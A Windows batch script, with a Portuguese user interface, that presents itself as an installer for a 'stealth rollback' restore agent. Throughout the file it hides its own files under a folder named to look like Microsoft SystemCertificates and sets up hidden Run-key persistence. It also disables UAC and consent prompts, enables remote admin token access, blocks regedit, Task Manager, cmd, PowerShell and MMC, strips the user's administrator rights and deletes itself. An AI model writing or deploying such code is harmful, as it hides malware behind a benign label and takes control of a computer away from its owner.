@echo off
setlocal enabledelayedexpansion

:: =================================================================================
:: Iracema Stealth Rollback Service Installer - v1.0
:: Author: Eduardo Somensi Barbosa.
:: 
:: Purpose:
:: 1. Verifies that all required components are present.
:: 2. Installs the Launcher and Executor in the user's secret directory.
:: 3. Copies the registry backup to the same location.
:: 4. Configures registry persistence to start with Windows (background).
:: 5. Hides all files and folders with system attributes.
:: =================================================================================

mkdir %LOCALAPPDATA%\Microsoft\SystemCertificates

set "secretPath=%LOCALAPPDATA%\Microsoft\SystemCertificates"
set "launcherFile=WinLogonSvc.bat"
set "workerFile=restore_worker.bat"
set "regFile=%secretPath%\HKCU_GoldenState.reg"

:START
cls
echo.
echo      +----------------------------------------------------------+
echo      ^|                                                          ^|
echo      ^|    INSTALADOR DO AGENTE DE RESTAURACAO DE PONTO DE RETORNO   ^|
echo      ^|                                                          ^|
echo      +----------------------------------------------------------+
echo.
echo   Este programa ira instalar o sistema de restauracao automatica
echo   para este usuario. Se possível, execute como administrador.
echo.
echo.
echo   Verificando componentes necessarios...
echo.

set "error=0"
if not exist "%~dp0\%launcherFile%" (
    echo   [ERRO] Arquivo do Lancador ausente: %launcherFile%
    set "error=1"
) else (
    echo   [OK]   Arquivo do Lancador encontrado.
)

if not exist "%~dp0\%workerFile%" (
    echo   [ERRO] Arquivo do Executor ausente: %workerFile%
    set "error=1"
) else (
    echo   [OK]   Arquivo do Executor encontrado.
)

if not exist "%~dp0\%regFile%" (
    reg export "HKCU" "%regFile%" /y >nul
    echo   [OK]   Arquivo de Registro criado.
    set "error=0"
) else (
    echo   [OK]   Arquivo de Registro encontrado.
)

if %error% == 1 (
    echo.
    echo   ------------------------------------------------------------
    echo   Instalacao abortada. Corrija os erros e tente novamente.
    echo   ------------------------------------------------------------
    pause
    goto :eof
)

echo.
echo   ------------------------------------------------------------
echo   Todos os componentes estao prontos para a instalacao.
echo   A seguinte acao sera executada:
echo.
echo   - Os arquivos serao copiados para: %secretPath%
echo   - O Agente sera configurado para iniciar com o Windows em background (sem janela).
echo   - Todos os arquivos implantados serao ocultados.
echo   ------------------------------------------------------------
echo.

choice /c SN /n /m "Deseja continuar com a instalacao? [S/N] "
if errorlevel 2 (
    echo.
    echo Instalacao cancelada pelo usuario.
    pause
    goto :eof
)
echo.
echo.

echo [ACAO]   Criando diretorio de sistema...
mkdir "%secretPath%" 2>nul
echo [ACAO]   Copiando arquivos do Agente...
copy /Y "%~dp0\%launcherFile%" "%secretPath%\" >nul
copy /Y "%~dp0\%workerFile%" "%secretPath%\" >nul
copy /Y "%~dp0\%regFile%" "%secretPath%\" >nul

echo [ACAO]   Criando o script VBS para executar em background...
(
    echo Set WshShell = CreateObject^("WScript.Shell"^)
    echo WshShell.Run ^"""" & WScript.Arguments(0) & """" , 0, False
) > "%secretPath%\launcher_invisible.vbs"

echo [SUCESSO] Arquivos copiados e script VBS criado.
echo.
echo [ACAO]   Configurando persistencia no registro para executar em segundo plano...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SysCertSvc" /t REG_SZ /d "wscript.exe \"%secretPath%\\launcher_invisible.vbs\" \"%secretPath%\\%launcherFile%\"" /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SysCertSvc" /t REG_SZ /d "wscript.exe \"%secretPath%\\launcher_invisible.vbs\" \"%secretPath%\\%launcherFile%\"" /f >nul

if %errorlevel% equ 0 (
    echo [SUCESSO] Persistencia configurada para executar em background.
) else (
    echo [ERRO]   Falha ao configurar a persistencia.
)
echo.
echo [ACAO]   Aplicando modo furtivo (ocultando arquivos) e protegendo arquivos...
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableSecureUIAPaths /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
attrib +s +h "%secretPath%\*" >nul 2>&1
attrib +s +h "%secretPath%" >nul 2>&1
echo [SUCESSO] Modo furtivo ativado e arquivos protegidos contra exclusão.
echo.

icacls "%secretPath%" /grant "SYSTEM:(OI)(CI)(F)" >nul 2>&1
icacls "%secretPath%" /grant "Administradores:(OI)(CI)(F)" >nul 2>&1

echo [ACAO] Bloqueando execucao de programas que comprometem o sistema...

:: Ativa política para desabilitar execução de programas
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v DisallowRun /t REG_DWORD /d 1 /f >nul

:: Cria a lista de programas proibidos
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "1" /t REG_SZ /d "regedit.exe" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "2" /t REG_SZ /d "taskmgr.exe" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "3" /t REG_SZ /d "cmd.exe" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "4" /t REG_SZ /d "powershell.exe" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "5" /t REG_SZ /d "mmc.exe" /f >nul

echo [SUCESSO] Execucao dos programas proibidos bloqueada.

echo [ACAO]   Retirando privilégios administrativos...
net localgroup Administradores "%USERNAME%" /delete >nul 2>&1
net localgroup Administrators "%USERNAME%" /delete >nul 2>&1
net localgroup "Power Users" "%USERNAME%" /delete >nul 2>&1

echo [SUCESSO] Permissões de sistema e administrador aplicadas.

echo.
echo   +----------------------------------------------------------+
echo   ^|                                                          ^|
echo   ^|      INSTALACAO CONCLUIDA COM SUCESSO!                   ^|
echo   ^|                                                          ^|
echo   +----------------------------------------------------------+
echo.

choice /c SN /n /m "Deseja remover os arquivos de instalacao originais? (Recomendado) [S/N] "
if errorlevel 2 (
    goto :eof
)

del /f /q "%~dp0\%launcherFile%" >nul 2>&1
del /f /q "%~dp0\%workerFile%" >nul 2>&1
del /f /q "%~dp0\%regFile%" >nul 2>&1

(goto) 2>nul & del "%~f0"
